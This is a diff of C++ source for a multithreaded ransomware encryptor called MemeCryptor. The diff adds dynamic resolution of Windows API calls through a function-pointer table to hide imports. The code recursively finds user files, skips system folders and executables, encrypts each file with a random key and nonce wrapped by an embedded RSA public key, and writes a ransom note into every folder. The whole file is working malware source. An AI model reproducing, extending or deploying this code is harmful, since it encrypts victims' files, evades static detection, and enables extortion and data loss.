@@ -1,19 +1,73 @@
 #include "Threading.h"
 THREAD_STRUCT threadStruct;
 LPCSTR ransomNoteContent = "YA YEET!!\n\nYou have officially been memed by MemeCryptor Ransomware!\n\nAll your files are now encrypted and embedded inside an image format.\nIf you try to use any recovery software outhere, the files can potentially be damaged and unretrievable...\n\nJust kidding! I have included my decrypting software on the github repo,\nso you can download and decrypt your stuff!!\n\n---------------------------------------------------------\n\nFeel free to contact me on Twitter @cPeterr to provide any feedback!\n\nThanks,\nPeter\n";
+
+extern FARPROC APIArray[52];
+MemelstrcmpA TemplstrcmpA;
+MemeStrStrIA TempStrStrIA;
+MemeCreateFileA TempCreateFileA2;
+MemeWriteFile TempWriteFile2;
+MemeCloseHandle TempCloseHandle2;
+MemeFindFirstFileA TempFindFirstFileA;
+MemeEnterCriticalSection TempEnterCriticalSection;
+MemeLeaveCriticalSection TempLeaveCriticalSection;
+MemeCryptGenRandom TempCryptGenRandom2;
+MemeFindNextFileA TempFindNextFileA;
+MemeFindClose TempFindClose;
+MemeCryptAcquireContextA TempCryptAcquireContextA;
+MemeCryptImportKey TempCryptImportKey;
+MemeCryptReleaseContext TempCryptReleaseContext2;
+MemeExitThread TempExitThread;
+MemeGetNativeSystemInfo TempGetNativeSystemInfo;
+MemeInitializeCriticalSection TempInitializeCriticalSection;
+MemeCreateThread TempCreateThread;
+MemeWaitForMultipleObjects TempWaitForMultipleObjects;
+MemeDeleteCriticalSection TempDeleteCriticalSection;
+
+void populateAPIThreading() {
+	TemplstrcmpA = (MemelstrcmpA)APIArray[25];
+	TempStrStrIA = (MemeStrStrIA)APIArray[51];
+	TempCreateFileA2 = (MemeCreateFileA)APIArray[8];
+	TempWriteFile2 = (MemeWriteFile)APIArray[9];
+	TempCloseHandle2 = (MemeCloseHandle)APIArray[10];
+	TempFindFirstFileA = (MemeFindFirstFileA)APIArray[26];
+	TempEnterCriticalSection = (MemeEnterCriticalSection)APIArray[27];
+	TempLeaveCriticalSection = (MemeLeaveCriticalSection)APIArray[28];
+	TempCryptGenRandom2 = (MemeCryptGenRandom)APIArray[37];
+	TempFindNextFileA = (MemeFindNextFileA)APIArray[29];
+	TempFindClose = (MemeFindClose)APIArray[30];
+	TempCryptAcquireContextA = (MemeCryptAcquireContextA)APIArray[42];
+	TempCryptImportKey = (MemeCryptImportKey)APIArray[43];
+	TempCryptReleaseContext2 = (MemeCryptReleaseContext)APIArray[41];
+	TempExitThread = (MemeExitThread)APIArray[31];
+	TempGetNativeSystemInfo = (MemeGetNativeSystemInfo)APIArray[32];
+	TempInitializeCriticalSection = (MemeInitializeCriticalSection)APIArray[33];
+	TempCreateThread = (MemeCreateThread)APIArray[34];
+	TempWaitForMultipleObjects = (MemeWaitForMultipleObjects)APIArray[35];
+	TempDeleteCriticalSection = (MemeDeleteCriticalSection)APIArray[36];
+}
+
 int checkDirName(LPSTR directoryName) {
+	if (!TemplstrcmpA) {
+		populateAPIThreading();
+	}
 	LPCSTR dirNameExcludeArray[16] = { "AppData", "tmp", "winnt", "temp", "thumb", "$Recycle.Bin", "$RECYCLE.BIN", "System Volume Information", "Boot", "Windows", "$WINDOWS.~BT", "Windows.old", "PerfLog", "Microsoft" };
 	for (int i = 0; i < 16; i++) {
-		if (!lstrcmpA(directoryName, dirNameExcludeArray[i])) {
+		if (!TemplstrcmpA(directoryName, dirNameExcludeArray[i])) {
 			return -1;
 		}
 	}
 	return 0;
 }
+
 int checkFileName(LPSTR directoryName) {
-	LPCSTR fileNameExcludeArray[15] = { ".exe", ".dll", ".sys", ".msi", ".mui", ".inf", ".cat", ".bat", ".cmd", ".ps1", ".vbs", ".ttf", ".fon", ".lnk", "READMEPLEASE.TXT" };
+	if (!TemplstrcmpA) {
+		populateAPIThreading();
+	}
+
+	LPCSTR fileNameExcludeArray[15] = { ".exe", ".dll", ".sys", ".msi", ".mui", ".inf", ".cat", ".bat", ".cmd", ".ps1", ".vbs", ".ttf", ".fon", ".lnk" };
 	for (int i = 0; i < 15; i++) {
-		if (StrStrIA(directoryName, fileNameExcludeArray[i])) {
+		if (TempStrStrIA(directoryName, fileNameExcludeArray[i])) {
 			return -1;
 		}
 	}
@@ -21,6 +75,9 @@ int checkFileName(LPSTR directoryName) {
 }
 
 void dropRansomNote(LPSTR directoryName) {
+	if (!TemplstrcmpA) {
+		populateAPIThreading();
+	}
 	LPSTR fileName = (LPSTR)calloc(strlen(directoryName) + strlen("READMEPLEASE.TXT") + 1, 1);
 	if (!fileName) {
 		return;
@@ -29,25 +86,28 @@ void dropRansomNote(LPSTR directoryName) {
 	strncpy(fileName, directoryName, strlen(directoryName) - 1);
 	strcat(fileName, "READMEPLEASE.TXT\0");
 
-	HANDLE ransomNote = CreateFileA(fileName, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+	HANDLE ransomNote = TempCreateFileA2(fileName, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	if (ransomNote == INVALID_HANDLE_VALUE) {
 		free(fileName);
 		return;
 	}
-	WriteFile(ransomNote, ransomNoteContent, strlen(ransomNoteContent), NULL, NULL);
-	CloseHandle(ransomNote);
+	TempWriteFile2(ransomNote, ransomNoteContent, strlen(ransomNoteContent), NULL, NULL);
+	TempCloseHandle2(ransomNote);
 	free(fileName);
 }
 
 int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPSTR directoryName, THREAD_STRUCT* pThreadStruct) {
+	if (!TemplstrcmpA) {
+		populateAPIThreading();
+	}
 	HANDLE hSearchHandle = NULL;
 	WIN32_FIND_DATAA findFileData = WIN32_FIND_DATAA();
 	LPSTR fileName = NULL;
 	int returnValue = -1;
 	BYTE* key = NULL;
 	BYTE* nonce = NULL;
-	hSearchHandle = FindFirstFileA(directoryName, &findFileData);
+	hSearchHandle = TempFindFirstFileA(directoryName, &findFileData);
 
 	if (hSearchHandle == INVALID_HANDLE_VALUE) {
 		goto CLEANUP;
@@ -57,12 +117,12 @@ int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPSTR direc
 	// 53 medium files -> 6237 ms to encrypt medium files
 	// 25 large files -> 25000 ms to encrypt large files
 	do {
-		if (StrStrIA(findFileData.cFileName, "Microsoft")) {
+		if (TempStrStrIA(findFileData.cFileName, "Microsoft")) {
 			continue;
 		}
 
-		if (lstrcmpA(findFileData.cFileName, ".")) {
-			if (lstrcmpA(findFileData.cFileName, "..")) {
+		if (TemplstrcmpA(findFileData.cFileName, ".")) {
+			if (TemplstrcmpA(findFileData.cFileName, "..")) {
 				if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)) {
 					if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
 
@@ -82,15 +142,17 @@ int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPSTR direc
 						strncpy(fileName, directoryName, strlen(directoryName) - 1);
 						strcat(fileName, findFileData.cFileName);
 						strcat(fileName, "\\*");
-						EnterCriticalSection(&pThreadStruct->threadCriticalSection);
+						TempEnterCriticalSection(&pThreadStruct->threadCriticalSection);
 						addNode(pThreadStruct, fileName);
-						LeaveCriticalSection(&pThreadStruct->threadCriticalSection);
+						TempLeaveCriticalSection(&pThreadStruct->threadCriticalSection);
 					}
 					else {
 						if (checkFileName(findFileData.cFileName) == -1) {
 							continue;
 						}
-
+						if (!TemplstrcmpA(findFileData.cFileName, "READMEPLEASE.TXT")) {
+							continue;
+						}
 						LPSTR fileName = (LPSTR)calloc(strlen(directoryName) + strlen(findFileData.cFileName) + 1, 1);
 						if (!fileName) {
 							continue;
@@ -114,14 +176,14 @@ int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPSTR direc
 							continue;
 						}
 
-						if (!CryptGenRandom(hCryptProv, 256, key)) {
+						if (!TempCryptGenRandom2(hCryptProv, 256, key)) {
 							free(fileName);
 							free(key);
 							free(nonce);
 							continue;
 						}
 
-						if (!CryptGenRandom(hCryptProv, 8, nonce)) {
+						if (!TempCryptGenRandom2(hCryptProv, 8, nonce)) {
 							free(fileName);
 							free(key);
 							free(nonce);
@@ -136,53 +198,49 @@ int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPSTR direc
 				}
 			}
 		}
-	} while (FindNextFileA(hSearchHandle, &findFileData) != 0);
+	} while (TempFindNextFileA(hSearchHandle, &findFileData) != 0);
 
 	returnValue = 0;
 CLEANUP:
 	if (hSearchHandle) {
-		FindClose(hSearchHandle);
+		TempFindClose(hSearchHandle);
 	}
 	return returnValue;
 }
 
 int acquireContext(HCRYPTPROV* phCryptProv) {
-	if (CryptAcquireContextA(phCryptProv, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+	if (!TemplstrcmpA) {
+		populateAPIThreading();
+	}
+	if (TempCryptAcquireContextA(phCryptProv, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
 		return 0;
 	}
-	if (CryptAcquireContextA(phCryptProv, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, 0xF0000008)) {
+	if (TempCryptAcquireContextA(phCryptProv, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, 0xF0000008)) {
 		return 0;
 	}
-	if (CryptAcquireContextA(phCryptProv, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider (Prototype)", PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+	if (TempCryptAcquireContextA(phCryptProv, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider (Prototype)", PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
 		return 0;
 	}
-	if (CryptAcquireContextA(phCryptProv, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider (Prototype)", PROV_RSA_AES, 0xF0000008)) {
+	if (TempCryptAcquireContextA(phCryptProv, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider (Prototype)", PROV_RSA_AES, 0xF0000008)) {
 		return 0;
 	}
 	return -1;
 }
 
-// make sure cryptinit has been called already
 void threadEncrypt(THREAD_STRUCT* pThreadStruct) {
-	DWORD currThreadID;
+	if (!TemplstrcmpA) {
+		populateAPIThreading();
+	}
 	HCRYPTPROV hCryptProv;
 	HCRYPTKEY publicKey;
 	int returnVal = -1;
 	int threadID = -1;
-	currThreadID = GetCurrentThreadId();
-
-	for (int i = 0; i < pThreadStruct->threadCount; i++) {
-		if (currThreadID == GetThreadId(pThreadStruct->threadArray[i])) {
-			threadID = i;
-			break;
-		}
-	}
 
 	if (acquireContext(&hCryptProv) == -1) {
 		goto CLEANUP;
 	}
 
-	if (CryptImportKey(hCryptProv, publicKeyBlob, 532, 0, 0, &publicKey) == FALSE) {
+	if (TempCryptImportKey(hCryptProv, publicKeyBlob, 532, 0, 0, &publicKey) == FALSE) {
 		goto CLEANUP;
 	}
 
@@ -193,12 +251,12 @@ void threadEncrypt(THREAD_STRUCT* pThreadStruct) {
 			if (counter == 2) {
 				goto CLEANUP;
 			}
-			EnterCriticalSection(&pThreadStruct->threadCriticalSection);
+			TempEnterCriticalSection(&pThreadStruct->threadCriticalSection);
 			if (pThreadStruct->head) {
 				curr = popNode(pThreadStruct);
 				break;
 			}
-			LeaveCriticalSection(&pThreadStruct->threadCriticalSection);
+			TempLeaveCriticalSection(&pThreadStruct->threadCriticalSection);
 			counter++;
 		}
 
@@ -213,7 +271,7 @@ void threadEncrypt(THREAD_STRUCT* pThreadStruct) {
 		strcpy(dirName, curr->dirName);
 		freeNode(curr);
 
-		LeaveCriticalSection(&pThreadStruct->threadCriticalSection);
+		TempLeaveCriticalSection(&pThreadStruct->threadCriticalSection);
 
 		mainThreadEncryption(hCryptProv, publicKey, dirName, pThreadStruct);
 
@@ -224,17 +282,21 @@ void threadEncrypt(THREAD_STRUCT* pThreadStruct) {
 
 CLEANUP:
 	if (hCryptProv) {
-		CryptReleaseContext(hCryptProv, 0);
+		TempCryptReleaseContext2(hCryptProv, 0);
 	}
-	ExitThread(returnVal);
+	TempExitThread(returnVal);
 }
 
 int initThreadStruct() {
+	if (!TemplstrcmpA) {
+		populateAPIThreading();
+	}
+
 	THREAD_STRUCT* pThreadStruct = &threadStruct;
 
 	SYSTEM_INFO systemInfo = SYSTEM_INFO();
 
-	GetNativeSystemInfo(&systemInfo);
+	TempGetNativeSystemInfo(&systemInfo);
 
 	pThreadStruct->threadCount = systemInfo.dwNumberOfProcessors;
 
@@ -242,15 +304,16 @@ int initThreadStruct() {
 	if (!buffer) {
 		return -1;
 	}
-	InitializeCriticalSection(&pThreadStruct->threadCriticalSection);
+	TempInitializeCriticalSection(&pThreadStruct->threadCriticalSection);
 
 	pThreadStruct->threadArray = buffer;
 	return 0;
 }
 
-
 void launchThreadEncrypt(LPSTR drivePath) {
-
+	if (!TemplstrcmpA) {
+		populateAPIThreading();
+	}
 	THREAD_STRUCT* pThreadStruct = &threadStruct;
 	LPSTR firstDir = (LPSTR)(calloc(strlen(drivePath) + 3, 1));
 	if (!firstDir) {
@@ -261,23 +324,25 @@ void launchThreadEncrypt(LPSTR drivePath) {
 
 	addNode(pThreadStruct, firstDir);
 	for (int i = 0; i < pThreadStruct->threadCount; i++) {
-		pThreadStruct->threadArray[i] = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)threadEncrypt, pThreadStruct, 0, 0);
+		pThreadStruct->threadArray[i] = TempCreateThread(0, 0, (LPTHREAD_START_ROUTINE)threadEncrypt, pThreadStruct, 0, 0);
 		if (pThreadStruct->threadArray[i] == 0 || pThreadStruct->threadArray[i] == INVALID_HANDLE_VALUE) {
 			continue;
 		}
 	}
 }
 
-
 void cleanUpThread() {
+	if (!TemplstrcmpA) {
+		populateAPIThreading();
+	}
 	THREAD_STRUCT* pThreadStruct = &threadStruct;
 
-	WaitForMultipleObjects(pThreadStruct->threadCount, pThreadStruct->threadArray, TRUE, INFINITE);
-	DeleteCriticalSection(&pThreadStruct->threadCriticalSection);
+	TempWaitForMultipleObjects(pThreadStruct->threadCount, pThreadStruct->threadArray, TRUE, INFINITE);
+	TempDeleteCriticalSection(&pThreadStruct->threadCriticalSection);
 	if (pThreadStruct->threadArray) {
 		for (int i = 0; i < pThreadStruct->threadCount; i++) {
 			if (pThreadStruct->threadArray[i]) {
-				CloseHandle(pThreadStruct->threadArray[i]);
+				TempCloseHandle2(pThreadStruct->threadArray[i]);
 			}
 		}
 		free(pThreadStruct->threadArray);
@@ -285,6 +350,9 @@ void cleanUpThread() {
 }
 
 void freeNode(LL_NODE* node) {
+	if (!TemplstrcmpA) {
+		populateAPIThreading();
+	}
 	if (node) {
 		if (node->dirName) {
 			free(node->dirName);
@@ -304,7 +372,6 @@ LL_NODE* popNode(THREAD_STRUCT* pThreadStruct) {
 }
 
 int addNode(THREAD_STRUCT* pThreadStruct, LPSTR name) {
-
 	LL_NODE* node = newNode();
 	if (!node) {
 		return -1;
